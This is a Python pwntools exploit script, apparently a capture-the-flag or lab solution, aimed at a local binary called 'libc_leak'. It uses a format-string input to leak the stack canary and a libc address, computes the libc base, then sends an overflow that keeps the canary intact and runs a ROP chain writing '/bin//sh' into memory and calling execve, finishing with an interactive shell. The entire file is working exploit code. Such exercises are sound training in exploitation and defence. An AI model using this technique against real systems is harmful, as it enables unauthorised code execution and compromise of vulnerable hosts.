import pwn

elf = pwn.context.binary = pwn.ELF("./libc_leak")
libc = elf.libc

if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path)
else:
    io = pwn.process(elf.path)

io.sendline(b"%11$lx:%17$lx")
stack_canary, __libc_start_main_234 = map(
    lambda x: int(x, 16), io.recvline().split(b":")
)
print(f"stack_canary: {hex(stack_canary)}")
print(f"__libc_start_main+234: {hex(__libc_start_main_234)}")

__libc_start_main_ofs = 0x26C20
libc.address = __libc_start_main_234 - __libc_start_main_ofs - 234

return_address_ofs = 48

data_ofs = 0x1BE1A0
pop_rdx_ofs = 0xCB1CD
pop_rax_ofs = 0x3EE88
pop_rdi_ofs = 0x26796
pop_rsi_ofs = 0x2890F
mov_rdx_ptr_rax_ofs = 0x34B5C
xor_rax_rax_ofs = 0x9D9C5
syscall_ofs = 0x2552B

payload = b"A" * (return_address_ofs - 8)
payload += pwn.p64(stack_canary)
payload += pwn.p64(0xDEADBEEF)

payload += pwn.p64(libc.address + pop_rdx_ofs)  # pop rdx ; ret
payload += pwn.p64(libc.address + data_ofs)  # @ .data
payload += pwn.p64(libc.address + pop_rax_ofs)  # pop rax ; ret
payload += b"/bin//sh"
payload += pwn.p64(libc.address + mov_rdx_ptr_rax_ofs)  # mov qword ptr [rdx], rax ; ret
payload += pwn.p64(libc.address + pop_rdx_ofs)  # pop rdx ; ret
payload += pwn.p64(libc.address + data_ofs + 8)  # @ .data + 8
payload += pwn.p64(libc.address + xor_rax_rax_ofs)  # xor rax, rax ; ret
payload += pwn.p64(libc.address + mov_rdx_ptr_rax_ofs)  # mov qword ptr [rdx], rax ; ret
payload += pwn.p64(libc.address + pop_rdi_ofs)  # pop rdi ; ret
payload += pwn.p64(libc.address + data_ofs)  # @ .data
payload += pwn.p64(libc.address + pop_rsi_ofs)  # pop rsi ; ret
payload += pwn.p64(libc.address + data_ofs + 8)  # @ .data + 8
payload += pwn.p64(libc.address + pop_rdx_ofs)  # pop rdx ; ret
payload += pwn.p64(libc.address + data_ofs + 8)  # @ .data + 8
payload += pwn.p64(libc.address + pop_rax_ofs)  # pop rax ; ret
payload += pwn.p64(0x3B)
payload += pwn.p64(libc.address + syscall_ofs)  # syscall

io.sendline(payload)

io.interactive()
